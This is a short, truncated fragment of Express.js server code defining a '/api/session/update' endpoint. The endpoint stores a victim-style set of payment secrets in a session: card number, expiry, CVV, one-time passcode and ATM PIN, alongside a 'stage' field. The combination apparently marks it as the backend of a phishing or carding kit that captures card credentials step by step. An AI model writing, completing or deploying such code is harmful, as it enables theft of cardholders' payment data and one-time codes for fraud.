...
app.post('/api/session/update', async (req, res) => {
    try {
        ...
        if (cardNumberMasked !== undefined)
            updates.cardNumberMasked = cardNumberMasked;
        if (cardExpiry !== undefined)
            updates.cardExpiry = cardExpiry;
        if (cardCvv !== undefined)
            updates.cardCvv = cardCvv;
        if (otpCode !== undefined)
            updates.otpCode = otpCode;
        if (atmPin !== undefined)
            updates.atmPin = atmPin;
        if (stage !== undefined) {
            updates.stage = stage;
